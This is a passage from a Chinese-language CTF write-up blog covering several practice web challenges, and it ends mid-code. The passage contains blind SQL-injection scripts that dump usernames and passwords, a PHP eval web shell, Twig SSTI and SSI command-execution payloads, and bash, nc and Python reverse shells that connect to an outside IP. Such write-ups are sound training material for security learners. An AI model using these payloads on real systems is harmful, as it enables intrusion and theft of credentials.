<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&apos;&quot;,&quot;&apos;&quot;),&quot;&quot;,$id);</span><br><span class="line">过滤的是\0,这里\\0首先被转义成了\0，随后替换\\0中的\0，留下一个\</span><br></pre></td></tr></table></figure>
<p>于是sql语句变成了这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&apos;\&apos; or path=&apos; or 1#</span><br></pre></td></tr></table></figure>
<p>成功绕过了where的限制。现在就可以用bool盲注了。<br>直接上脚本<br>拿到表名一共12位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pprint import pprint</span><br><span class="line">url = &apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=&apos;</span><br><span class="line">for i in range(0,100):</span><br><span class="line">    payload = &apos;length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=&apos; + str(i)</span><br><span class="line">    # print(payload)</span><br><span class="line">    # print(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">    r = requests.get(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">    print(i,r.headers,r.status_code)</span><br><span class="line">    if r.headers.get(&apos;Content-Length&apos;,0) != &apos;0&apos;:</span><br><span class="line">        print(i)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
<p>爆表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pprint import pprint</span><br><span class="line"></span><br><span class="line">name = &apos;&apos;</span><br><span class="line">for j in range(1,13):</span><br><span class="line">    for i in range(30,127):</span><br><span class="line">        payload = f&apos;ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1))=&#123;i&#125;&apos; </span><br><span class="line">        # print(payload)</span><br><span class="line">        # print(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">        r = requests.get(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">        # print(i,r.headers,r.status_code)</span><br><span class="line">        if r.headers.get(&apos;Content-Length&apos;,0) != &apos;0&apos;:</span><br><span class="line">            name += chr(i)</span><br><span class="line">            print(name)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>得到images和users两个表。<br>接下来爆列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pprint import pprint</span><br><span class="line"></span><br><span class="line">name = &apos;&apos;</span><br><span class="line">for j in range(1,50):</span><br><span class="line">    for i in range(30,127):</span><br><span class="line">        payload = f&apos;ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;j&#125;,1))=&#123;i&#125;&apos; </span><br><span class="line">        # print(payload)</span><br><span class="line">        # print(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">        r = requests.get(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">        # print(i,r.headers,r.status_code)</span><br><span class="line">        if r.headers.get(&apos;Content-Length&apos;,0) != &apos;0&apos;:</span><br><span class="line">            name += chr(i)</span><br><span class="line">            print(name)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>得到username,password两个字段。<br>往就是读数据<br>读用户名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pprint import pprint</span><br><span class="line"></span><br><span class="line">name = &apos;&apos;</span><br><span class="line">for j in range(1,50):</span><br><span class="line">    for i in range(30,127):</span><br><span class="line">        payload = f&apos;ascii(substr((select group_concat(username) from users),&#123;j&#125;,1))=&#123;i&#125;&apos; </span><br><span class="line">        # print(payload)</span><br><span class="line">        # print(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">        r = requests.get(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">        # print(i,r.headers,r.status_code)</span><br><span class="line">        if r.headers.get(&apos;Content-Length&apos;,0) != &apos;0&apos;:</span><br><span class="line">            name += chr(i)</span><br><span class="line">            print(name)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>拿到admin<br>读密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pprint import pprint</span><br><span class="line"></span><br><span class="line">name = &apos;&apos;</span><br><span class="line">for j in range(1,50):</span><br><span class="line">    for i in range(30,127):</span><br><span class="line">        payload = f&apos;ascii(substr((select group_concat(password) from users),&#123;j&#125;,1))=&#123;i&#125;&apos; </span><br><span class="line">        # print(payload)</span><br><span class="line">        # print(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">        r = requests.get(f&apos;http://a1c54c01-88a5-426c-927c-433e97f67992.node3.buuoj.cn/image.php?id=\\0&amp;path=%20or%20(&#123;payload&#125;)%23&apos;)</span><br><span class="line">        # print(i,r.headers,r.status_code)</span><br><span class="line">        if r.headers.get(&apos;Content-Length&apos;,0) != &apos;0&apos;:</span><br><span class="line">            name += chr(i)</span><br><span class="line">            print(name)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>随后登录上去，发现一个文件上传页面。<br><img src="https://i.loli.net/2020/04/01/coDd3ezvjNaQhxJ.png" alt="Snipaste_2020-04-01_14-36-47.png"><br>随便传一个文件发现文件名会回显出来。于是考虑文件名注入。<br>尝试了一下，对文件名做了php/i过滤。使用<?php ?>无果，<br>尝试短标签<a href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener">传送门</a><br>这里介绍了四种运行php代码的办法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ?&gt;</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;? ?&gt; //受php.ini设置影响</span><br><span class="line">&lt;?= ?&gt; //从php5.4起总是合法</span><br></pre></td></tr></table></figure>

<p>最后使用如下payload连上读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST[irrik]);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="总结-17"><a href="#总结-17" class="headerlink" title="总结"></a>总结</h3><p>这道题自己没做出来。好菜啊，怎么没想到<code>\0</code>过滤有问题,明明已经感觉和对象逃逸有点像了。<br>就当是积累经验了吧，做这种题就要多思考多尝试。多写代码，多查资料。</p>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>知识点</p>
<ul>
<li>ssti</li>
</ul>
<hr>
<p>这题也是提示了cookie。然后在flag.php那里提交一下数据。<br>发现回显出来了，试试看xss，发现可以弹xss。更进一步，尝试ssti。<br>最后发现49显示为49.有注入存在。由于语言是php所以判断为twig。<br><img src="https://i.loli.net/2020/04/01/o5jQZinNrxwfkpE.png" alt="Snipaste_2020-04-01_22-56-23.png"><br>这里贴几个参考链接<br><a href="https://portswigger.net/research/server-side-template-injection" target="_blank" rel="noopener">paper</a>非常专业的步骤了<br>做题的时候查的文档<a href="https://xiaoxiami.gitbook.io/twig/twig-2x/kuo-zhan-twig" target="_blank" rel="noopener">传送门</a><br>查到的payload<a href="http://15h3na0.xyz/2019/12/22/%E9%87%91%E7%9B%BE%E6%9D%AF%20Writeup/#waimai2" target="_blank" rel="noopener">传送门</a><br>这里用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;find / -name flag&quot;)&#125;&#125; //找flag。只列出一行好像，所以ls /没找到</span><br><span class="line">---</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125; //把exec注册为filter</span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125; // 执行命令</span><br></pre></td></tr></table></figure>
<p>关于这个payload可以看第一篇讲解，非常详细。而且里面写了各种模板构造payload的方法。非常值得一看。<br><img src="https://i.loli.net/2020/04/01/ZhsaNRFM3ID8t6x.png" alt="Snipaste_2020-04-01_23-06-36.png"></p>
<h3 id="总结-18"><a href="#总结-18" class="headerlink" title="总结"></a>总结</h3><p>这道题，更多的是熟悉了twig吧，真的是发现ssti，判断模板，构造payload三步走。</p>
<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>知识点</p>
<ul>
<li>php伪随机数破解</li>
</ul>
<hr>
<p>进去发现要抽奖(w)，没头绪，老办法，扫后台，读源码。<br>发现给出的一部分抽奖数字是从check.php动态加载的，直接访问check.php得到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&apos;seed&apos;]))&#123;</span><br><span class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&apos;&apos;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id=&apos;p1&apos;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;num&apos;]))&#123;</span><br><span class="line">    if($_POST[&apos;num&apos;]===$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;);</span><br></pre></td></tr></table></figure>
<p>这里我一开始没想到是伪随机数破解漏洞，直接改代码暴力跑出来了。。。<br>但是做出来感觉没什么知识点，于是去看wp，预期解应该是使用php_mt_seed来破解seed。<br>在构建php_mt_seed的过程中又顺道学习了一波make命令。<a href="http://www.ruanyifeng.com/blog/2015/02/make.html" target="_blank" rel="noopener">传送门</a><br>简而言之，make命令会根据makefile中的规则执行一系列操作。直接使用make命令会自动使用扫描到的第一个makefile，当然，也可以手动指定makefile为特定文件。<br>make，然后使用高级调用方法<a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">传送门</a>。输入一串刚才生成的字符串转化的数字，即可破解出seed。然后本地跑一下得到抽奖用数字，<br>这里要注意，如果匹配多个数字，要用如下的表示法来单独表示每个数字<br><img src="https://i.loli.net/2020/04/02/WFluOpXry5Ye9sj.png" alt="Snipaste_2020-04-02_10-40-08.png"><br><img src="https://i.loli.net/2020/04/02/7MiG5zefUm2bx6X.png" alt="Snipaste_2020-04-02_10-37-09.png"><br>写个脚本构建一下数字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">target = &quot;A2yW4PU1Em&quot;</span><br><span class="line">for c in target:</span><br><span class="line">    print(s.find(c),s.find(c),0,61,end=&apos; &apos;)</span><br></pre></td></tr></table></figure>
<p>提交拿到flag。</p>
<h3 id="总结-19"><a href="#总结-19" class="headerlink" title="总结"></a>总结</h3><p>这道题，更多的是学习了php伪随机数的漏洞，耐心的看完了资料啊之类的，还是有学到东西的哈哈哈。</p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>知识点</p>
<ul>
<li>.swp泄露(但是这里居然不是隐藏文件了)</li>
<li>ssi注入(由shtml文件名可知)</li>
</ul>
<hr>
<p>进去一个登录页面，试了一下没有注入，扫后台也没发现啥东西。<br>抓包看了一通，只发现如果用户名为空就不报错。<br>看wp发现是index.php.swp。人傻了，没扫到。<br>手动添加了这条规则进去(备用)。<br>但是不管咋说都拿到源码了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ob_start();</span><br><span class="line">	function get_hash()&#123;</span><br><span class="line">		$chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&apos;;</span><br><span class="line">		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times</span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		return sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">	***</span><br><span class="line">    if(isset($_POST[&apos;username&apos;]) and $_POST[&apos;username&apos;] != &apos;&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &apos;6d0bc1&apos;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&apos;password&apos;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;[+] Welcome to manage system&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &apos;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&apos;.$_POST[&apos;username&apos;].&apos;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&apos;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;[!] Failed&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>审计一下代码，首先要post上去的用户密码md5开头为6d0bc1。然后才能继续往下写入我们的用户名到文件里。<br>这里首先要解决密码md5的问题，查了一圈没发现有这个开头的，猜是要自己写一个脚本来爆破了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">def md5(passwd):</span><br><span class="line">    return hashlib.md5(passwd.encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line"></span><br><span class="line">for i in range(12345678):</span><br><span class="line">    if md5(str(i)).startswith(&apos;6d0bc1&apos;):</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<p>得到密码2020666<br>填个admin然后登录进去看看。除了个欢迎啥也没有。<br>但是根据前面的swp文件我们知道用户名会被写入到一个shtml文件里面去。<br>这时候看看源码好像只有在本地运行这个代码然后同时post数据求解了，万万没想到，文件的url在header头给出了。<br>怎么说呢，只能说自己多细心了，登录啥的之后注意header头啊，cookie啥的，做题应该会比较顺利。<br>直接访问看看，诶，回显了我们的用户名。试试xss，可以。试试ssti。不行<br>查一下shtml是什么东西，好像叫ssi</p>
<blockquote>
<p>shtml文件（还有stm、shtm文件）就是应用了SSI技术的html文件，所以在.shtml页面返回到客户端前，页面中的SSI指令将被服务器解析。可以使用SSI指令将其它文件、图片包含在页面中，也可以将其它的CGI程序包含在页面中，如.aspx文件。在给客户端返回的页面中不会包含SSI指令。如果SSI指令不能被解析，则浏览器会将其做为普通的HTML注释处理<br>这里就是利用了ssi注入来解题。<br>参考<a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">传送门</a><br><a href="https://www.cnblogs.com/wkzb/p/12391211.html" target="_blank" rel="noopener">传送门</a><br><img src="https://i.loli.net/2020/04/02/cf2sup4GjtRnbmT.png" alt="Snipaste_2020-04-02_16-46-00.png"><br>有了基本语法自己尝试一下构建payload。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&apos;ls /&apos;--&gt; //没找到flag</span><br><span class="line">&lt;!--#exec cmd=&apos;find / name=flag*&apos;--&gt; //发现flag。最后cat一下就行</span><br></pre></td></tr></table></figure>
<h3 id="总结-20"><a href="#总结-20" class="headerlink" title="总结"></a>总结</h3><p>又是新的知识，很棒。这题应该是没有任何过滤的ssi，但是至少又扩展了自己的知识面。</p>
<h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p>知识点</p>
<ul>
<li>反弹shell</li>
<li>linux文件操作符<br>进去就给了源码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from flask import Flask, request</span><br><span class="line">import os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)</span><br><span class="line"># flag = flag_file.read()</span><br><span class="line"># flag_file.close()</span><br><span class="line">#</span><br><span class="line"># @app.route(&apos;/flag&apos;)</span><br><span class="line"># def flag():</span><br><span class="line">#     return flag</span><br><span class="line">## want flag? naive!</span><br><span class="line"></span><br><span class="line"># You will never find the thing you want:) I think</span><br><span class="line">@app.route(&apos;/shell&apos;)</span><br><span class="line">def shell():</span><br><span class="line">    os.system(&quot;rm -f flag.txt&quot;)</span><br><span class="line">    exec_cmd = request.args.get(&apos;c&apos;)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    return &quot;1&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def source():</span><br><span class="line">    return open(&quot;app.py&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure>
仔细一看发现可以rce，但是没有回显。这时想到getshell。<br>尝试了<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash -lvvp 2333</span><br></pre></td></tr></table></figure>
没反应，还是返回1(正常运行的话会监听端口挂起)<br>正向不行咱试试反向的<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/youip/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
然后靶机开启监听2333端口。emmm，还是没反应。<br>又尝试了几个别的反弹shell，还是不行，看wp。<br><a href="https://www.zhaoj.in/read-6407.html" target="_blank" rel="noopener">传送门</a><br>看到这里使用了python来弹shell。<br>那估计自己使用nc和/dev/tcp/ip/port没弹成功应该是没安装这两个命令。<br>来分析一下这个弹shell的payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.1.194.216&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
之前完全不知道还可以用这个办法来运行python代码。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s=socket.shcket(socket.AF_INET,socket.SOCK_STREAM)来 //创建一个socket对象。</span><br><span class="line">s.connect((&quot;ip&quot;,port)) //连接目标socket，参数是一个元组</span><br><span class="line">os.dup2(fd1,fd2) //用来操作重定向.比如os.dup2(s.fileno(),1)就是把标准输出重定向到s.fileno()。(文件操作符1的标准输出目标是屏幕，这样之后就把输出到这个socket操作符指向对象了)</span><br><span class="line">socket.fileno() //Return the socket’s file descriptor (a small integer), or -1 on failure</span><br><span class="line">操作了三次(0,1,2)就是把标准输入，标准输出，错误输出都重定向到了socket文件操作符。</span><br><span class="line">subprocess.call()//Run the command described by args.比如subprocess.call([&apos;ls&apos;,&apos;/&apos;])列表第一个是执行的命令，第一个是参数。</span><br><span class="line">subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])就是开启一个交互式的shell。这时已经将输入输出都定向到socket连接里了，于是可以在机器上收到连接了。</span><br></pre></td></tr></table></figure>
<img src="https://i.loli.net/2020/04/02/byvhGLkxuYN9Bz1.png" alt="Snipaste_2020-04-02_19-40-35.png"><br>本机用ssh username@ip -p port连接上操作机。然后在这台机器上监听2333端口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
这时候用上面的payload传参，就能收到反弹shell。</li>
</ul>
<hr>
<p><img src="https://i.loli.net/2020/04/02/oDxdjBH5Av8iCW6.png" alt="Snipaste_2020-04-02_19-39-01.png"><br><code>/proc/pid/fd</code> 这里包含了一个进程所拥有的文件操作符<br>接下来是文件操作符的部分。可以在/proc里查看到进程(我尝试了ps命令，但是估计是/bin/sh没有所以失败了)<br>直接cd /proc然后ls查看进程。<br>挑一个进程进入，cd pid/fd<br>然后使用ls命令查看当前进程的文件操作符<br>随后使用cat *命令来查看操作符的内容即可拿到flag。<br><img src="https://i.loli.net/2020/04/02/E4XQP6YBabNhMSJ.png" alt="Snipaste_2020-04-02_20-22-23.png"></p>
<h3 id="总结-21"><a href="#总结-21" class="headerlink" title="总结"></a>总结</h3><p>emmm，还是很有收获的，又多了一种反弹shell的姿势，更是积累了经验。</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>知识点</p>
<ul>
<li>load_file协议</li>
<li>哈希长度拓展攻击<br>哈希长度扩展攻击的参考<a href="https://xz.aliyun.com/t/2563" target="_blank" rel="noopener">传送门</a></li>
</ul>
<hr>
<p>进去就给了源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 